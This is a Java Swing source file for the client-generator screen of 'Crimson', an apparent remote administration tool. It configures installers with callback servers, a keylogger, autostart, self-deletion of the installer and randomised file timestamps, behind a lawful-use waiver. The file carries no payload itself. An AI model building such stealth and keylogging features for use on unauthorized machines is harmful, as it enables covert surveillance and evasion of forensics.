/******************************************************************************
 *                                                                            *
 *                    Copyright 2016 Subterranean Security                    *
 *                                                                            *
 *  Licensed under the Apache License, Version 2.0 (the "License");           *
 *  you may not use this file except in compliance with the License.          *
 *  You may obtain a copy of the License at                                   *
 *                                                                            *
 *      http://www.apache.org/licenses/LICENSE-2.0                            *
 *                                                                            *
 *  Unless required by applicable law or agreed to in writing, software       *
 *  distributed under the License is distributed on an "AS IS" BASIS,         *
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.  *
 *  See the License for the specific language governing permissions and       *
 *  limitations under the License.                                            *
 *                                                                            *
 *****************************************************************************/
package com.subterranean_security.crimson.viewer.ui.screen.generator;

import java.awt.BorderLayout;
import java.awt.Color;
import java.awt.Dimension;
import java.awt.FlowLayout;
import java.awt.Font;
import java.awt.GridLayout;
import java.awt.Insets;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.MouseAdapter;
import java.awt.event.MouseEvent;
import java.io.File;
import java.text.DateFormat;
import java.util.Date;

import javax.swing.Box;
import javax.swing.BoxLayout;
import javax.swing.DefaultComboBoxModel;
import javax.swing.ImageIcon;
import javax.swing.JButton;
import javax.swing.JCheckBox;
import javax.swing.JComboBox;
import javax.swing.JFileChooser;
import javax.swing.JLabel;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JSpinner;
import javax.swing.JTabbedPane;
import javax.swing.JTextArea;
import javax.swing.JTextField;
import javax.swing.SpinnerNumberModel;
import javax.swing.SwingConstants;
import javax.swing.border.BevelBorder;
import javax.swing.border.EtchedBorder;
import javax.swing.border.TitledBorder;

import com.subterranean_security.crimson.core.Common;
import com.subterranean_security.crimson.core.attribute.keys.AKeySimple;
import com.subterranean_security.crimson.core.proto.Generator.ClientConfig;
import com.subterranean_security.crimson.core.proto.Generator.NetworkTarget;
import com.subterranean_security.crimson.core.proto.Keylogger.Trigger;
import com.subterranean_security.crimson.core.proto.Misc.AuthType;
import com.subterranean_security.crimson.core.ui.StatusLabel;
import com.subterranean_security.crimson.core.util.RandomUtil;
import com.subterranean_security.crimson.core.util.Validation;
import com.subterranean_security.crimson.universal.Universal;
import com.subterranean_security.crimson.viewer.store.ProfileStore;
import com.subterranean_security.crimson.viewer.ui.UICommon;
import com.subterranean_security.crimson.viewer.ui.common.panels.sl.epanel.EPanel;
import com.subterranean_security.crimson.viewer.ui.screen.generator.tabs.ATab;
import com.subterranean_security.crimson.viewer.ui.screen.generator.tabs.FTab;
import com.subterranean_security.crimson.viewer.ui.screen.generator.tabs.NTab;

public class GenPanel extends JPanel {

	private static final long serialVersionUID = 1L;
	public JTextField fld_path;
	private JPanel otab;
	private NTab ntab;
	private FTab ftab;
	public ATab atab;
	private JPanel etab;
	private JPanel optab;
	public JTextField fld_ctime;
	private StatusLabel lbl_status;
	private JCheckBox cbx_waiver;

	private JTextArea txt_output_desc;
	private JLabel lblApproximateOutputSize = new JLabel();

	private static final String jar = "Runnable Java Archive (.jar)";
	private static final String exe = "Windows Portable Executable (.exe)";
	private static final String apk = "Android Application (.apk)";
	private static final String sh = "Shell Script (.sh)";
	private JSpinner fld_delay;

	private String[] ipath_win = new String[] { "C:/Users/%USERNAME%/Documents/Crimson" };
	private String[] ipath_lin = new String[] { "/home/%USERNAME%/.crimson" };
	private String[] ipath_osx = new String[] { "/home/%USERNAME%/.crimson" };
	private String[] ipath_sol = new String[] { "/home/%USERNAME%/.crimson" };
	private String[] ipath_bsd = new String[] { "/home/%USERNAME%/.crimson" };

	public GenPanel() {
		init();

		changeToJar();

		if (Universal.isDebug) {
			ntab.table.add(NetworkTarget.newBuilder().setServer("127.0.0.1").setPort(10101).build());
			fld_path.setText("C:/Users/dev/Desktop/client.jar");
			cbx_waiver.setSelected(true);
		}

	}

	public void init() {
		setLayout(new BorderLayout(0, 0));

		JTabbedPane tabbedPane = new JTabbedPane(JTabbedPane.LEFT);
		add(tabbedPane, BorderLayout.CENTER);

		optab = new JPanel();
		tabbedPane.addTab(null, optab);
		tabbedPane.setTabComponentAt(0, new GenTabComponent("link", "Setup"));
		optab.setLayout(new BoxLayout(optab, BoxLayout.Y_AXIS));

		JPanel panel_3 = new JPanel();

		optab.add(panel_3);

		type_comboBox = new JComboBox<String>();
		type_comboBox.setEnabled(false);
		type_comboBox.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				switch ((String) type_comboBox.getSelectedItem()) {
				case jar: {
					changeToJar();
					return;
				}
				case exe: {
					changeToExe();
					return;
				}
				case apk: {
					changeToApk();
					return;
				}
				case sh: {
					changeToSh();
					return;
				}
				}
			}
		});
		panel_3.setLayout(new BorderLayout(0, 0));
		type_comboBox.setFont(new Font("Dialog", Font.BOLD, 11));
		type_comboBox.setModel(new DefaultComboBoxModel(new String[] { "Runnable Java Archive (.jar)",
				"Windows Portable Executable (.exe)", "Android Application (.apk)", "Shell Script (.sh)" }));
		panel_3.add(type_comboBox, BorderLayout.NORTH);

		JPanel panel_100 = new JPanel();

		panel_3.add(panel_100, BorderLayout.CENTER);
		panel_100.setLayout(new BorderLayout(0, 0));

		txt_output_desc = new JTextArea();
		txt_output_desc.setWrapStyleWord(true);
		txt_output_desc.setFont(new Font("Dialog", Font.PLAIN, 11));
		txt_output_desc.setLineWrap(true);
		txt_output_desc.setEditable(false);
		txt_output_desc.setBorder(new EtchedBorder(EtchedBorder.LOWERED, null, null));
		txt_output_desc.setOpaque(false);
		panel_100.add(txt_output_desc);
		panel_100.add(Box.createVerticalStrut(5), BorderLayout.NORTH);
		panel_3.add(Box.createHorizontalStrut(10), BorderLayout.EAST);
		panel_3.add(Box.createHorizontalStrut(10), BorderLayout.WEST);

		JPanel panel_2 = new JPanel();
		panel_2.setPreferredSize(new Dimension(300, 60));
		panel_2.setBorder(new TitledBorder(UICommon.basic, "Platform Compatibility", TitledBorder.LEADING,
				TitledBorder.TOP, null, new Color(51, 51, 51)));
		panel_2.setLayout(new GridLayout(0, 3, 0, 0));

		lblWindows = new JLabel("Windows");
		lblWindows.setHorizontalAlignment(SwingConstants.CENTER);
		lblWindows.setToolTipText("Runs on Vista through Windows 10");
		lblWindows.setFont(new Font("Dialog", Font.BOLD, 10));
		panel_2.add(lblWindows);

		lblLinux = new JLabel("Linux");
		lblLinux.setHorizontalAlignment(SwingConstants.CENTER);
		lblLinux.setFont(new Font("Dialog", Font.BOLD, 10));
		panel_2.add(lblLinux);

		lblMacOsX = new JLabel("Mac OS X");
		lblMacOsX.setHorizontalAlignment(SwingConstants.CENTER);
		lblMacOsX.setFont(new Font("Dialog", Font.BOLD, 10));
		panel_2.add(lblMacOsX);

		lblSolaris = new JLabel("Solaris");
		lblSolaris.setHorizontalAlignment(SwingConstants.CENTER);
		lblSolaris.setFont(new Font("Dialog", Font.BOLD, 10));
		panel_2.add(lblSolaris);

		lblBsd = new JLabel("BSD");
		lblBsd.setHorizontalAlignment(SwingConstants.CENTER);
		lblBsd.setFont(new Font("Dialog", Font.BOLD, 10));
		panel_2.add(lblBsd);

		lblAndroid = new JLabel("Android");
		lblAndroid.setHorizontalAlignment(SwingConstants.CENTER);
		lblAndroid.setFont(new Font("Dialog", Font.BOLD, 10));
		panel_2.add(lblAndroid);
		panel_3.add(panel_2, BorderLayout.SOUTH);

		JPanel panel_1 = new JPanel();
		panel_1.setBorder(new TitledBorder(UICommon.basic, "Optional Information", TitledBorder.LEADING,
				TitledBorder.TOP, null, null));
		optab.add(panel_1);
		panel_1.setLayout(new BorderLayout(0, 0));

		JPanel panel_15 = new JPanel();

		panel_1.add(panel_15, BorderLayout.CENTER);
		panel_15.setLayout(new BorderLayout(0, 0));

		JLabel lblInstallMessage = new JLabel("  Install Message:");
		lblInstallMessage.setVerticalAlignment(SwingConstants.TOP);
		panel_15.add(lblInstallMessage, BorderLayout.WEST);
		lblInstallMessage.setFont(new Font("Dialog", Font.BOLD, 10));

		JScrollPane scrollPane = new JScrollPane();
		panel_15.add(scrollPane, BorderLayout.EAST);
		panel_15.add(Box.createVerticalStrut(5), BorderLayout.NORTH);
		panel_15.add(Box.createVerticalStrut(5), BorderLayout.SOUTH);

		fld_install_message = new JTextArea();
		fld_install_message.setColumns(20);
		fld_install_message.addMouseListener(new MouseAdapter() {
			@Override
			public void mouseEntered(MouseEvent e) {
				lbl_status.setInfo("a message to be displayed on client installation");
			}

			@Override
			public void mouseExited(MouseEvent e) {
				lbl_status.setDefault();
			}
		});
		fld_install_message.setLineWrap(true);
		fld_install_message.setWrapStyleWord(true);
		fld_install_message.setFont(new Font("Dialog", Font.PLAIN, 10));
		scrollPane.setViewportView(fld_install_message);

		JPanel panel_16 = new JPanel();
		panel_1.add(panel_16, BorderLayout.NORTH);
		panel_16.setLayout(new BorderLayout(0, 0));

		JLabel lblIdentifier = new JLabel("  Client Identifier:");
		lblIdentifier.setFont(new Font("Dialog", Font.BOLD, 10));
		panel_16.add(lblIdentifier, BorderLayout.WEST);

		textField = new JTextField();
		textField.addMouseListener(new MouseAdapter() {
			@Override
			public void mouseEntered(MouseEvent arg0) {
				lbl_status.setInfo("an optional text identifier");
			}

			@Override
			public void mouseExited(MouseEvent e) {
				lbl_status.setDefault();
			}
		});
		panel_16.add(textField, BorderLayout.EAST);
		textField.setColumns(15);

		ftab = new FTab(lblApproximateOutputSize);
		tabbedPane.addTab(null, ftab);
		tabbedPane.setTabComponentAt(1, new GenTabComponent("plugin", "Features"));

		etab = new JPanel();
		tabbedPane.addTab(null, etab);
		tabbedPane.setTabComponentAt(2, new GenTabComponent("checkerboard", "Execution"));
		etab.setLayout(new FlowLayout(FlowLayout.CENTER, 5, 5));

		JPanel panel_7 = new JPanel();
		panel_7.setPreferredSize(new Dimension(340, 120));
		panel_7.setBorder(
				new TitledBorder(UICommon.basic, "Options", TitledBorder.LEADING, TitledBorder.TOP, null, null));
		etab.add(panel_7);
		panel_7.setLayout(null);

		JLabel lblDelay = new JLabel("Execution delay:");
		lblDelay.setHorizontalAlignment(SwingConstants.TRAILING);
		lblDelay.setFont(new Font("Dialog", Font.BOLD, 10));
		lblDelay.setBounds(12, 20, 107, 15);
		panel_7.add(lblDelay);

		fld_delay = new JSpinner();
		fld_delay.setModel(new SpinnerNumberModel(0, 0, 3600, 1));
		fld_delay.setBounds(132, 17, 57, 19);
		panel_7.add(fld_delay);

		JLabel lblSeconds = new JLabel("seconds");
		lblSeconds.setFont(new Font("Dialog", Font.BOLD, 10));
		lblSeconds.setBounds(195, 20, 73, 15);
		panel_7.add(lblSeconds);

		chckbxRecoverFromErrors = new JCheckBox("Recover from errors");
		chckbxRecoverFromErrors.setFont(new Font("Dialog", Font.BOLD, 10));
		chckbxRecoverFromErrors.setBounds(8, 64, 151, 20);
		panel_7.add(chckbxRecoverFromErrors);

		chckbxInstallWhenIdle = new JCheckBox("Delay until idle");
		chckbxInstallWhenIdle.setFont(new Font("Dialog", Font.BOLD, 10));
		chckbxInstallWhenIdle.setBounds(8, 43, 151, 20);
		panel_7.add(chckbxInstallWhenIdle);

		chckbxInstallAutostartModule = new JCheckBox("Install autostart module");
		chckbxInstallAutostartModule.setFont(new Font("Dialog", Font.BOLD, 10));
		chckbxInstallAutostartModule.setBounds(163, 43, 166, 20);
		panel_7.add(chckbxInstallAutostartModule);

		chckbxDeleteInstaller = new JCheckBox("Delete installer");
		chckbxDeleteInstaller.addMouseListener(new MouseAdapter() {
			@Override
			public void mouseEntered(MouseEvent e) {
				lbl_status.setInfo("delete installer after installation");
			}

			@Override
			public void mouseExited(MouseEvent e) {
				lbl_status.setDefault();
			}
		});
		chckbxDeleteInstaller.setBounds(163, 64, 164, 23);
		panel_7.add(chckbxDeleteInstaller);
		chckbxDeleteInstaller.setFont(new Font("Dialog", Font.BOLD, 10));

		JPanel panel_6 = new JPanel();
		panel_6.setPreferredSize(new Dimension(340, 150));
		panel_6.setBorder(new TitledBorder(UICommon.basic, "Installation Directory", TitledBorder.LEADING,
				TitledBorder.TOP, null, null));
		panel_6.setBounds(12, 12, 341, 144);
		etab.add(panel_6);
		panel_6.setLayout(null);

		fld_install_windows = new JComboBox<String>();
		fld_install_windows.setFont(new Font("Dialog", Font.BOLD, 9));
		fld_install_windows.setModel(new DefaultComboBoxModel<String>(ipath_win));
		fld_install_windows.setEditable(true);
		fld_install_windows.setBounds(90, 17, 239, 19);
		panel_6.add(fld_install_windows);

		fld_install_linux = new JComboBox<String>();
		fld_install_linux.setFont(new Font("Dialog", Font.BOLD, 10));
		fld_install_linux.setModel(new DefaultComboBoxModel<String>(ipath_lin));
		fld_install_linux.setEditable(true);
		fld_install_linux.setBounds(90, 42, 239, 19);
		panel_6.add(fld_install_linux);

		fld_install_osx = new JComboBox<String>();
		fld_install_osx.setFont(new Font("Dialog", Font.BOLD, 10));
		fld_install_osx.setModel(new DefaultComboBoxModel<String>(ipath_osx));
		fld_install_osx.setEditable(true);
		fld_install_osx.setBounds(90, 67, 239, 19);
		panel_6.add(fld_install_osx);

		fld_install_bsd = new JComboBox<String>();
		fld_install_bsd.setFont(new Font("Dialog", Font.BOLD, 10));
		fld_install_bsd.setModel(new DefaultComboBoxModel<String>(ipath_bsd));
		fld_install_bsd.setEditable(true);
		fld_install_bsd.setBounds(90, 117, 239, 19);
		panel_6.add(fld_install_bsd);

		fld_install_solaris = new JComboBox<String>();
		fld_install_solaris.setFont(new Font("Dialog", Font.BOLD, 10));
		fld_install_solaris.setModel(new DefaultComboBoxModel<String>(ipath_sol));
		fld_install_solaris.setEditable(true);
		fld_install_solaris.setBounds(90, 92, 239, 19);
		panel_6.add(fld_install_solaris);

		JLabel lblWindows = new JLabel("Windows:");
		lblWindows.setFont(new Font("Dialog", Font.BOLD, 10));
		lblWindows.setBounds(12, 20, 70, 15);
		panel_6.add(lblWindows);

		JLabel lblLinux = new JLabel("Linux:");
		lblLinux.setFont(new Font("Dialog", Font.BOLD, 10));
		lblLinux.setBounds(12, 44, 70, 15);
		panel_6.add(lblLinux);

		JLabel lblOsX = new JLabel("OS X:");
		lblOsX.setFont(new Font("Dialog", Font.BOLD, 10));
		lblOsX.setBounds(12, 69, 70, 15);
		panel_6.add(lblOsX);

		JLabel lblSolaris = new JLabel("Solaris:");
		lblSolaris.setFont(new Font("Dialog", Font.BOLD, 10));
		lblSolaris.setBounds(12, 94, 70, 15);
		panel_6.add(lblSolaris);

		JLabel lblBsd = new JLabel("BSD:");
		lblBsd.setFont(new Font("Dialog", Font.BOLD, 10));
		lblBsd.setBounds(12, 119, 70, 15);
		panel_6.add(lblBsd);

		JPanel panel = new JPanel();
		panel.setLayout(new BorderLayout());
		EPanel ep = new EPanel(panel);
		ntab = new NTab(ep);
		panel.add(ntab, BorderLayout.CENTER);

		tabbedPane.addTab(null, ep);
		tabbedPane.setTabComponentAt(3, new GenTabComponent("computer", "Network"));
		ntab.setLayout(new FlowLayout(FlowLayout.CENTER, 5, 5));

		atab = new ATab();
		tabbedPane.addTab(null, atab);
		tabbedPane.setTabComponentAt(4, new GenTabComponent("lock", "Auth"));

		otab = new JPanel();
		otab.setBorder(new BevelBorder(BevelBorder.LOWERED, null, null, null, null));
		tabbedPane.addTab(null, otab);
		tabbedPane.setTabComponentAt(5, new GenTabComponent("linechart", "Output"));
		otab.setLayout(new FlowLayout(FlowLayout.CENTER, 5, 5));

		JPanel panel_18 = new JPanel();
		panel_18.setPreferredSize(new Dimension(354, 300));
		otab.add(panel_18);
		panel_18.setLayout(null);

		cbx_waiver = new JCheckBox(
				"<html>I will use Crimson in accordance with all applicable laws and never on unauthorized machines.");
		cbx_waiver.setBounds(12, 232, 333, 41);
		panel_18.add(cbx_waiver);
		cbx_waiver.setFont(new Font("Dialog", Font.BOLD, 10));

		JPanel pl_timestamps = new JPanel();
		pl_timestamps.setBounds(12, 92, 330, 68);
		panel_18.add(pl_timestamps);
		pl_timestamps.setBorder(
				new TitledBorder(null, "Arbitrary Timestamps", TitledBorder.LEADING, TitledBorder.TOP, null, null));

		JButton btnRandom = new JButton("Random");
		btnRandom.setBounds(263, 19, 55, 17);
		btnRandom.setPreferredSize(new Dimension(55, 17));
		btnRandom.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				setCreationDate(new Date(RandomUtil.rand(0L, new Date().getTime())));
			}
		});
		pl_timestamps.setLayout(null);

		JLabel lblCreation = new JLabel("Creation:");
		lblCreation.setBounds(12, 20, 52, 13);
		lblCreation.setFont(new Font("Dialog", Font.BOLD, 10));
		pl_timestamps.add(lblCreation);

		fld_ctime = new JTextField();
		fld_ctime.setBounds(82, 19, 176, 17);
		fld_ctime.setHorizontalAlignment(SwingConstants.CENTER);
		fld_ctime.setFont(new Font("Dialog", Font.PLAIN, 10));
		fld_ctime.setColumns(20);
		setCreationDate(new Date());
		pl_timestamps.add(fld_ctime);

		btnRandom.setFont(new Font("Dialog", Font.BOLD, 9));
		btnRandom.setMargin(new Insets(1, 4, 1, 4));
		pl_timestamps.add(btnRandom);

		JPanel pl_output = new JPanel();
		pl_output.setBounds(12, 12, 330, 68);
		panel_18.add(pl_output);
		pl_output.setBorder(
				new TitledBorder(null, "Output Location", TitledBorder.LEADING, TitledBorder.TOP, null, null));
		pl_output.setLayout(null);

		JButton btnBrowse = new JButton("Browse");
		btnBrowse.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				JFileChooser jfc = new JFileChooser();
				if (jfc.showDialog(otab, "Select") == JFileChooser.APPROVE_OPTION) {
					File file = jfc.getSelectedFile();
					// TODO check extension
					fld_path.setText(file.getAbsolutePath());
				}
			}
		});
		btnBrowse.setFont(new Font("Dialog", Font.BOLD, 9));
		btnBrowse.setMargin(new Insets(2, 4, 2, 4));
		btnBrowse.setBounds(269, 18, 49, 19);
		pl_output.add(btnBrowse);

		fld_path = new JTextField();
		fld_path.setFont(new Font("Dialog", Font.PLAIN, 11));
		fld_path.setBounds(65, 18, 198, 19);
		pl_output.add(fld_path);
		fld_path.setColumns(10);

		JLabel lblFile = new JLabel("File:");
		lblFile.setFont(new Font("Dialog", Font.BOLD, 10));
		lblFile.setBounds(12, 20, 49, 15);
		pl_output.add(lblFile);

		lblApproximateOutputSize.setHorizontalAlignment(SwingConstants.CENTER);
		lblApproximateOutputSize.setBorder(new EtchedBorder(EtchedBorder.LOWERED, null, null));
		lblApproximateOutputSize.setFont(new Font("Dialog", Font.BOLD, 10));
		lblApproximateOutputSize.setBounds(20, 44, 290, 15);
		pl_output.add(lblApproximateOutputSize);

		JPanel panel1 = new JPanel();
		panel1.setBorder(new EtchedBorder(EtchedBorder.LOWERED, null, null));
		add(panel1, BorderLayout.SOUTH);
		panel1.setLayout(new BorderLayout(0, 0));

		lbl_status = new StatusLabel("set or load generation options");
		panel1.add(lbl_status);

	}

	public Date currentCTime;// see getvalues() for reasoning
	private JTextArea fld_install_message;
	private JComboBox<String> fld_install_windows;
	private JComboBox<String> fld_install_linux;
	private JComboBox<String> fld_install_osx;
	private JComboBox<String> fld_install_bsd;
	private JComboBox<String> fld_install_solaris;
	private JComboBox<String> type_comboBox;

	private JTextField textField;

	private JLabel lblWindows;
	private JLabel lblSolaris;
	private JLabel lblLinux;
	private JLabel lblBsd;
	private JLabel lblMacOsX;
	private JLabel lblAndroid;
	private JCheckBox chckbxInstallAutostartModule;
	private JCheckBox chckbxInstallWhenIdle;
	private JCheckBox chckbxRecoverFromErrors;
	private JCheckBox chckbxDeleteInstaller;

	private void setCreationDate(Date d) {
		currentCTime = d;
		fld_ctime.setText(DateFormat.getDateTimeInstance(DateFormat.MEDIUM, DateFormat.SHORT).format(currentCTime));

	}

	public String getGroupPrefix() {
		return atab.getGroupPrefix();
	}

	public void cancelTimer() {
		atab.cancelTimer();
	}

	public ClientConfig getValues() {

		if (!cbx_waiver.isSelected()) {
			return null;
		}

		ClientConfig.Builder ic = ClientConfig.newBuilder();

		// general
		ic.setOutputType((String) type_comboBox.getSelectedItem());
		ic.setBuildNumber(Common.build);

		// network
		for (NetworkTarget nt : ntab.table.getTargets()) {
			if (nt != null) {
				ic.addTarget(nt);
			}
		}

		// execution
		ic.setAlwaysImsg(false);
		ic.setImsg(fld_install_message.getText());

		ic.setMelt(chckbxDeleteInstaller.isSelected());
		ic.setAutostart(chckbxInstallAutostartModule.isSelected());
		ic.setViewerUser(ProfileStore.getLocalViewer().get(AKeySimple.VIEWER_USER));

		ic.setDelay((int) fld_delay.getValue());
		ic.setReconnectPeriod((int) ntab.fld_connect_period.getValue());
		ic.setKeylogger(ftab.chckbxKeylogger.isSelected());

		ic.setAllowMiscConnections(!ntab.chckbxDontMiscConnections.isSelected());

		switch (((ImageIcon) atab.authType.getSelectedItem()).getDescription()) {
		case "Group": {
			ic.setAuthType(AuthType.GROUP);
			String group = (String) atab.groupSelectionBox.getSelectedItem();
			if (group.equals("Create Group")) {
				ic.setGroupName(atab.fld_group_name.getText());
			} else {
				ic.setGroupName(group);
			}

			break;
		}
		case "Password": {
			ic.setAuthType(AuthType.PASSWORD);
			ic.setPassword(atab.getPassword());
			break;
		}
		case "None": {
			ic.setAuthType(AuthType.NO_AUTH);
			break;
		}
		}

		if (ftab.chckbxWindows.isSelected()) {
			if (fld_install_windows.getSelectedItem() == null) {
				ic.setPathWin(ipath_win[0]);
			} else {
				ic.setPathWin((String) fld_install_windows.getSelectedItem());
			}
		}

		if (ftab.chckbxLinux.isSelected()) {
			if (fld_install_linux.getSelectedItem() == null) {
				ic.setPathLin(ipath_lin[0]);
			} else {
				ic.setPathLin((String) fld_install_linux.getSelectedItem());
			}
		}

		if (ftab.chckbxOsX.isSelected()) {
			if (fld_install_osx.getSelectedItem() == null) {
				ic.setPathOsx(ipath_osx[0]);
			} else {
				ic.setPathOsx((String) fld_install_osx.getSelectedItem());
			}
		}

		if (ftab.chckbxSolaris.isSelected()) {
			if (fld_install_solaris.getSelectedItem() == null) {
				ic.setPathSol(ipath_sol[0]);
			} else {
				ic.setPathSol((String) fld_install_solaris.getSelectedItem());
			}
		}

		if (ftab.chckbxBsd.isSelected()) {
			if (fld_install_bsd.getSelectedItem() == null) {
				ic.setPathBsd(ipath_bsd[0]);
			} else {
				ic.setPathBsd((String) fld_install_bsd.getSelectedItem());
			}
		}

		// keylogger options
		ic.setKeyloggerFlushMethod(Trigger.EVENT);
		ic.setKeyloggerFlushValue(15);

		return ic.build();
	}

	public boolean testValues(ClientConfig config) {

		if (config == null) {
			lbl_status.setBad("You must agree to the terms first");
			return false;
		}

		if (config.getTargetCount() == 0) {
			lbl_status.setBad("You must specify at least one server (Network Target)");
			return false;
		}

		if (!ftab.testValues()) {
			lbl_status.setBad("No compatible platforms");
			return false;
		}

		// test paths
		if (config.hasPathWin() && !Validation.path(config.getPathWin())) {
			lbl_status.setBad("Invalid Windows install path");
			return false;
		}

		if (config.hasPathLin() && !Validation.path(config.getPathLin())) {
			lbl_status.setBad("Invalid Linux install path");
			return false;
		}

		if (config.hasPathOsx() && !Validation.path(config.getPathOsx())) {
			lbl_status.setBad("Invalid OSX install path");
			return false;
		}

		if (config.hasPathSol() && !Validation.path(config.getPathSol())) {
			lbl_status.setBad("Invalid Solaris install path");
			return false;
		}

		if (config.hasPathBsd() && !Validation.path(config.getPathBsd())) {
			lbl_status.setBad("Invalid BSD install path");
			return false;
		}

		return true;
	}

	private void changeToJar() {

		txt_output_desc.setText(
				"The jar file installer works on many platforms and is the most popular way to install Crimson on clients.  Java 1.8 or greater is required before installation.");

		fld_install_bsd.setEnabled(true);

		lblAndroid.setForeground(StatusLabel.bad);
		lblMacOsX.setForeground(StatusLabel.good);
		lblBsd.setForeground(StatusLabel.good);
		lblLinux.setForeground(StatusLabel.good);
		lblSolaris.setForeground(StatusLabel.good);
		lblWindows.setForeground(StatusLabel.good);
	}

	private void changeToExe() {

		txt_output_desc.setText(
				"The executable installer can install Crimson on Windows machines only.  Java is NOT required before installation.");

		fld_install_bsd.setEnabled(false);

		lblAndroid.setForeground(StatusLabel.bad);
		lblMacOsX.setForeground(StatusLabel.bad);
		lblBsd.setForeground(StatusLabel.bad);
		lblLinux.setForeground(StatusLabel.bad);
		lblSolaris.setForeground(StatusLabel.bad);
		lblWindows.setForeground(StatusLabel.good);
	}

	private void changeToApk() {

		txt_output_desc.setText("The Android installer can install Crimson on Android devices version 2.2 and up.");

		fld_install_bsd.setEnabled(false);

		lblAndroid.setForeground(StatusLabel.good);
		lblMacOsX.setForeground(StatusLabel.bad);
		lblBsd.setForeground(StatusLabel.bad);
		lblLinux.setForeground(StatusLabel.bad);
		lblSolaris.setForeground(StatusLabel.bad);
		lblWindows.setForeground(StatusLabel.bad);
	}

	private void changeToSh() {

		txt_output_desc.setText("");

		fld_install_bsd.setEnabled(true);

		lblAndroid.setForeground(StatusLabel.bad);
		lblMacOsX.setForeground(StatusLabel.good);
		lblBsd.setForeground(StatusLabel.good);
		lblLinux.setForeground(StatusLabel.good);
		lblSolaris.setForeground(StatusLabel.good);
		lblWindows.setForeground(StatusLabel.bad);

	}
}
